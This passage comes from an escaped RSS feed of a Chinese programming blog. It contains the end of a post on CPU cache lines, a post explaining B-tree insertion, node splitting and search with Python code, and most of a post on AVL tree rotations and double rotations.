&lt;p>However, such lack of knowledge can ultimately produce a 10x or worse slowdown in application performance – especially since the arrival of &lt;a class="link" href="http://software.intel.com/en-us/articles/what-s-new-about-modern-hardware" target="_blank" rel="noopener"
>new hardware technologies&lt;/a>.&lt;/p>
&lt;/blockquote>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>什么是 cache line？&lt;/p>
&lt;blockquote>
&lt;p>Data moves around most of the memory subsystem in 64-byte quantities called &lt;em>cache lines&lt;/em>.&lt;/p>
&lt;/blockquote>
&lt;p>cache line 如何影响性能？&lt;/p></description></item><item><title>B树</title><link>https://nnnewb.github.io/blog/p/b-tree/</link><pubDate>Mon, 14 Feb 2022 10:53:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/b-tree/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>B树和B树的变体（B+树）因为对磁盘IO/缓存友好的原因，常被用做数据库索引和文件系统的数据结构。&lt;/p>
&lt;p>这篇博客主要是写一下B树如何插入和搜索，节点分裂机制以及如何自平衡。&lt;/p>
&lt;h2 id="节点结构">节点结构&lt;/h2>
&lt;p>B树和一般的二叉搜索树在节点结构上有很大区别。B树是一种多路搜索树，B树的节点可以有多个后继节点，一个节点会保存多个键。单个节点最多保存M个键的B树称作M阶B树。&lt;/p>
&lt;p>一个简单的 B 树节点结构如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">BTreeNode&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">parent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;BTreeNode&amp;#39;&lt;/span>
&lt;span class="n">entries&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">children&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;BTreeNode&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>B树要求除根节点外，每个节点最少包含&lt;code>M/2&lt;/code>个元素，非叶子节点的 &lt;code>children&lt;/code> 数量是 &lt;code>len(entries)+1&lt;/code>。根节点不要求最少元素数量，其他约束不变。&lt;/p>
&lt;h2 id="插入节点">插入节点&lt;/h2>
&lt;p>B树要求新的键只能在叶子节点上插入。如果叶子节点的键数量超过了上限&lt;code>M&lt;/code>，则叶子节点执行 &lt;strong>分裂&lt;/strong> 操作，将键分成三部分：中位数，小于中位数的部分，大于中位数的部分。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># 分裂前&lt;/span>
&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="c1"># 分裂后&lt;/span>
&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>中位数插入父节点，小于中位数的部分或大于中位数的部分创建新的子节点，插入父级节点。以插入元素 1-7 为例，图示如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/b-tree/image-20220214113130112.png"
width="526"
height="214"
srcset="https://nnnewb.github.io/blog/blog/p/b-tree/image-20220214113130112_hu5b12e769ccfd98fac492b0d669d71565_6441_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/b-tree/image-20220214113130112_hu5b12e769ccfd98fac492b0d669d71565_6441_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="元素1-6"
class="gallery-image"
data-flex-grow="245"
data-flex-basis="589px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/b-tree/image-20220214113110231.png"
width="580"
height="214"
srcset="https://nnnewb.github.io/blog/blog/p/b-tree/image-20220214113110231_hu367bf5992fa3acb17c83fa3ae5854998_8699_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/b-tree/image-20220214113110231_hu367bf5992fa3acb17c83fa3ae5854998_8699_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="插入元素7"
class="gallery-image"
data-flex-grow="271"
data-flex-basis="650px"
>&lt;/p>
&lt;p>对于中位数在 &lt;code>entries&lt;/code> 中间的情况不会更麻烦，只要记住新节点保存的都是大于中位数的部分，在&lt;code>entries&lt;/code>插入键之后，找到对应的&lt;code>children&lt;/code>下标插入即可。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">add_child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">child&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;非叶子节点添加新元素
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Args:
&lt;/span>&lt;span class="s2"> entry (int): 新元素
&lt;/span>&lt;span class="s2"> child (BTreeNode): 分裂出的新孩子
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="c1"># 遍历寻找比新 entry 更大的元素，如果不存在，则新 entry 添加到最后&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">enumerate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">child&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">grow&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">child&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">grow&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>完整代码会在文末给出。&lt;/p>
&lt;h2 id="自平衡">自平衡&lt;/h2>
&lt;p>B树是一种自平衡树，B树做到自平衡的方式比较特别。下面的内容都是我个人对B树的理解，偏见警告。&lt;/p>
&lt;p>一般的二叉搜索树插入元素时，会把元素插入到叶子节点上，叶子节点就变成了中间节点，子树会随着插入的元素增长而变高，于是在子树之间出现不平衡。也就是说，一般的二叉搜索树生长方向是向下，往叶子方向扩展。&lt;/p>
&lt;p>但B树正好相反：叶子节点不会变成中间节点，只会分裂兄弟节点，向父级节点插入键。而父级节点也会因为键超过&lt;code>M&lt;/code>而分裂，一直到根节点。根节点分裂则会产生新的根，原来的根变成两个兄弟节点，树的高度随之上升。也就是说，B树的生长高度是向上的，插入操作对树高度的影响最终体现为根节点的分裂。&lt;/p>
&lt;p>删除节点的规则也设计为保持这一特性，删除键对树高度的影响最终会体现为根节点和子节点合并，使得树高度降低。&lt;/p>
&lt;h2 id="搜索">搜索&lt;/h2>
&lt;p>B树的搜索和二叉搜索树差不多，不同的是节点会表示多个键，所以二叉搜索树中的比较操作会变成在多个键里查找值，并在中间节点没找到的时候递归搜索子节点。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="nb">bool&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">enumerate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;span class="c1"># 如果没找到，而且当前元素比搜索值要大了&lt;/span>
&lt;span class="c1"># 就从小于当前元素的子节点里递归搜索&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># 没有比搜索的键大的值，则从末尾的子节点（大于本节点全部键）递归搜索&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="分裂和需要注意的问题">分裂和需要注意的问题&lt;/h2>
&lt;p>分裂节点写起来很简单，比 AVL 旋转要好懂很多。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">grow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="c1"># 检查和处理分裂&lt;/span>
&lt;span class="c1"># B-Tree 的增长方向是横向+纵向，横向是扩展兄弟节点，纵向是往根节点方向生长&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">MAXIMUM_ENTRIES&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">middle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">MIDDLE_ENTRY_IDX&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">split_entries&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">MIDDLE_ENTRY_IDX&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:]&lt;/span>
&lt;span class="n">split_children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">MIDDLE_CHILD_IDX&lt;/span>&lt;span class="p">:]&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="n">MIDDLE_ENTRY_IDX&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="n">MIDDLE_CHILD_IDX&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">split_node&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BTreeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">split_node&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">split_entries&lt;/span>
&lt;span class="n">split_node&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">split_children&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">child&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">split_children&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">child&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">split_node&lt;/span>
&lt;span class="c1"># 中间节点分裂的情况&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">middle&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">split_node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="c1"># 根节点分裂，生成新的根节点&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BTreeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">split_node&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">split_node&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entries&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">middle&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>主要注意：&lt;/p>
&lt;ol>
&lt;li>选择合适的中位数。如果&lt;code>M&lt;/code>是奇数，&lt;code>M+1&lt;/code>除二没有余数，也选不出中位数。&lt;/li>
&lt;li>新节点（&lt;code>split_node&lt;/code>和&lt;code>split_children&lt;/code>）都需要重新调整&lt;code>parent&lt;/code>属性，不要漏了。&lt;/li>
&lt;li>中间节点的分裂要向上添加一个&lt;code>entry&lt;/code>和&lt;code>child&lt;/code>，分别表示键和大于这个键的节点。
&lt;ol>
&lt;li>这是个递归过程，上级节点也可能发生分裂，一直到根分裂。&lt;/li>
&lt;li>这个过程会保留原节点（&lt;code>self&lt;/code>），可以理解为&lt;code>children&lt;/code>的下标&lt;code>i&lt;/code>表示&lt;code>children[i]&lt;/code>这棵子树所有键小于&lt;code>entries[i]&lt;/code>。&lt;code>children[-1]&lt;/code>没有对应的&lt;code>entries&lt;/code>下标，表示的是大于节点所有键的子树，相当于是二叉搜索树中的右子树。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>根节点分裂会导致树的根发生改变，完成插入操作后需要重新确定根节点指针，不然会导致搜索出错或再次分裂的时候往错误的节点添加键，破坏搜索树的性质。&lt;/li>
&lt;/ol>
&lt;h2 id="b树性能">B树性能&lt;/h2>
&lt;p>B树的性能优势来自树的高度增长相对比较慢，选择合适的阶可以减少磁盘IO次数。另外就是一个节点包含多个键，提高键的储存密度，更符合局部性原理，相对于二叉搜索树来说对CPU缓存也更较友好。&lt;/p>
&lt;p>对这个场景我能想到的几个关键因素主要有：&lt;/p>
&lt;ul>
&lt;li>内存缓存。尽可能榨干可用的内存，避免频繁进行磁盘IO。&lt;/li>
&lt;li>局部性原理。&lt;/li>
&lt;/ul>
&lt;p>其中局部性原理又分几项。&lt;/p>
&lt;p>一个是内存的分页机制，在内存紧张的情况下如果节点集合大小不是一页的整数倍的话，会产生更多的缺页异常，造成更频繁地读盘（考虑使用了交换分区或 windows 页文件，又或者 &lt;code>mmap&lt;/code> 等方式读取）。&lt;/p>
&lt;p>另一个是CPU的高速缓存，如果结构填不满或者超出cache line 大小的话都会有影响。&lt;/p>
&lt;p>当然，最后还是具体问题具体分析。给这篇博客找资料的时候看到的这篇文章很不错 &lt;a class="link" href="http://igoro.com/archive/gallery-of-processor-cache-effects/" target="_blank" rel="noopener"
>gallery of processor cache effects&lt;/a>，挺喜欢的。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>b树是多路搜索树。&lt;/p>
&lt;p>b树插入节点总是在叶子，b树向根方向生长。&lt;/p>
&lt;p>b树通过节点分裂和合并实现自平衡。&lt;/p>
&lt;p>b树搜索和一般的二叉搜索树差别不大。&lt;/p>
&lt;p>以及b树性能优势来自树更矮，节点更少，键更集中，符合局部性原理，减少磁盘io次数，合适的阶让结构对缓存更友好。&lt;/p></description></item><item><title>AVL树</title><link>https://nnnewb.github.io/blog/p/avl-tree/</link><pubDate>Fri, 11 Feb 2022 15:07:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/avl-tree/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>还记得很久以前学数据结构只看到二叉树，讲到平衡，但平衡方法当时看纸质书手头也没有实验环境，后来就没继续学下去。现在有闲就重新捡起来学一下。先从AVL树继续看。&lt;/p>
&lt;h2 id="avl树">AVL树&lt;/h2>
&lt;p>AVL 树是以提出者名字命名的，Adelson-Velskii &amp;amp; Landis，俄国人，后来移居以色列。人怎么样不管啦。&lt;/p>
&lt;p>AVL 树是一种平衡二叉树，左右子树高度差不超过1。保持平衡的方法是每次插入数据的时候发现子树不平衡，就把较高的子树提升为根，把根变成新的根的子树，把较高的子树变矮，较矮的子树变高，实现平衡。这个过程被叫做旋转，下面介绍旋转。&lt;/p>
&lt;h2 id="左旋转右旋转">左旋转/右旋转&lt;/h2>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/avl-tree/640.webp"
width="1080"
height="302"
srcset="https://nnnewb.github.io/blog/blog/p/avl-tree/640_hue4f2eb0b84b4ee9edbff095635b31765_16328_480x0_resize_q75_h2_box_2.webp 480w, https://nnnewb.github.io/blog/blog/p/avl-tree/640_hue4f2eb0b84b4ee9edbff095635b31765_16328_1024x0_resize_q75_h2_box_2.webp 1024w"
loading="lazy"
alt="右旋转"
class="gallery-image"
data-flex-grow="357"
data-flex-basis="858px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/avl-tree/640-16445510501782.webp"
width="1080"
height="265"
srcset="https://nnnewb.github.io/blog/blog/p/avl-tree/640-16445510501782_hu6ffc1b8ea7f9226d8e679d85cbb8998e_14524_480x0_resize_q75_h2_box_2.webp 480w, https://nnnewb.github.io/blog/blog/p/avl-tree/640-16445510501782_hu6ffc1b8ea7f9226d8e679d85cbb8998e_14524_1024x0_resize_q75_h2_box_2.webp 1024w"
loading="lazy"
alt="左旋转"
class="gallery-image"
data-flex-grow="407"
data-flex-basis="978px"
>&lt;/p>
&lt;p>左旋转和右旋转的逻辑是一样的。如果右子树比左子树高，就把右子树提升成根。如果左子树比右子树高，就把左子树提升成根。提升右子树叫左旋转，提升左子树叫右旋转。&lt;/p>
&lt;p>把子树提升成根会有点麻烦。比如右子树提升为根，原来的根和左子树怎么办？我们并不想重新平衡树的时候把整个左子树都删掉，那原来的根和左子树就必须插回新的树里。&lt;/p>
&lt;p>我们知道右子树的 key 肯定比根和左子树所有节点大，所以根要插回树的话，一个很直接的想法就是把旧的根接到右子树左下角的叶子节点。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211115435552.png"
width="442"
height="352"
srcset="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211115435552_hudaf66137716a342688a9fcb78a9ab8fa_32310_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211115435552_hudaf66137716a342688a9fcb78a9ab8fa_32310_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="旧的根插回新根"
class="gallery-image"
data-flex-grow="125"
data-flex-basis="301px"
>&lt;/p>
&lt;p>的确，这样保持了二叉搜索树的特征，但新的树依然不平衡：节点5的左子树高度2，右子树高度0，高度差超过了1。稍微想想就知道，旧的根和左子树直接接到左下角叶子节点的话，会让原本平衡的新树左子树高度增加，进而失去平衡。&lt;/p>
&lt;p>解决方法也很简单，不要把旧的树接到新的树最小值上，而是把新树的左子树，移植成旧树的右子树，再把旧树移植成新树的左子树。这样一来，右子树的左子树和左子树的右子树不管怎么旋转，高度都一样。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211135807095.png"
width="559"
height="367"
srcset="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211135807095_huce0ca6d6e6da680d37b57191522379d3_34024_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211135807095_huce0ca6d6e6da680d37b57191522379d3_34024_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220211135807095"
class="gallery-image"
data-flex-grow="152"
data-flex-basis="365px"
>&lt;/p>
&lt;p>为什么这样可以保持平衡呢？首先AVL树的子树也是AVL树，所以子树的子树之间高度差也不超过1。左旋转、右旋转的的作用是让子树高度一侧升高，一侧降低——注意，左旋转只能降低右儿子的右子树高度，右儿子的左子树高度不变。右旋转只能降低左儿子的左子树高度，左儿子的右子树高度不变。&lt;/p>
&lt;p>举例来说，上图中右儿子的右子树（4-6-7-8）较高，旋转后变成了（6-7-8），而原本的（4-6-5）变成了（6-4-5），高度不变。&lt;/p>
&lt;p>这个规律很好理解，因为原来的右子树变成了根，整个右子树剩下的节点高度都降低了。而右子树的左子树变成了现在的左子树的右子树，和根的距离一样，所以高度不变。&lt;/p>
&lt;p>&lt;strong>左旋转让右子树的右子树高度-1，左子树的左子树高度+1。左子树的右子树高度等于右子树的左子树，旋转后新树的左右子树的高度相等。&lt;/strong>&lt;/p>
&lt;h2 id="双旋转">双旋转&lt;/h2>
&lt;p>对于往左儿子的左子树插入节点造成的不平衡，右旋转可以实现降低左儿子的左子树高度，再次平衡。往右儿子的右子树插入节点造成的不平衡，左旋转可以降低右儿子的右子树高度，再次平衡。但对于左儿子的右子树或右儿子的左子树插入节点造成的不平衡，一次左、右旋转无法实现再平衡。&lt;/p>
&lt;p>再看一个例子。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211141652944.png"
width="535"
height="399"
srcset="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211141652944_hue06f3e4447c8c13119165b1bee1e7d22_36072_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211141652944_hue06f3e4447c8c13119165b1bee1e7d22_36072_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220211141652944"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="321px"
>&lt;/p>
&lt;p>旋转前，右儿子的左子树（4-7-6-5）高度是4，旋转后（7-4-6-5）高度不变，依然是4，树仍然不平衡。解决办法也很简单，先把右子树（7）右旋，让右儿子的左子树高度低于右子树，再对整棵树左旋，也就是AVL树的双旋转。&lt;/p>
&lt;p>一步一步看双旋转是怎么解决这个问题的。&lt;/p>
&lt;p>第一步，右儿子的左子树比右儿子右子树高，所以将右儿子右旋，使得右儿子的右子树高于右儿子的左子树。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211142847329.png"
width="490"
height="346"
srcset="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211142847329_hudfe01573f636ba8f14106612b6b86fbd_23701_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211142847329_hudfe01573f636ba8f14106612b6b86fbd_23701_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220211142847329"
class="gallery-image"
data-flex-grow="141"
data-flex-basis="339px"
>&lt;/p>
&lt;p>我们知道的左旋转时右儿子的左子树高度不变，右儿子的右子树高度-1。这一步前，直接对整棵树左旋时，最高的那颗子树（右儿子的左子树）高度没有变化，树依然不平衡，只是变成了右子树更矮，左子树更高而已。&lt;/p>
&lt;p>而这一步之后，最高的子树变成了右子树的右子树。现在对整棵树左旋，右子树的右子树高度下降了，和原本右子树的左子树高度一致，达成平衡。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211151253277.png"
width="573"
height="352"
srcset="https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211151253277_hu3754058aad682cd96a93972186837210_33976_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/avl-tree/image-20220211151253277_hu3754058aad682cd96a93972186837210_33976_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220211151253277"
class="gallery-image"
data-flex-grow="162"
data-flex-basis="390px"
>&lt;/p>
&lt;p>这个原则简单地说，就是左子树下最高的子树应该是左子树，右子树下最高的子树应该是右子树。如果新增节点后不满足这个条件，就要先对左子树左旋，或者对右子树右旋，来满足这个条件。&lt;/p>
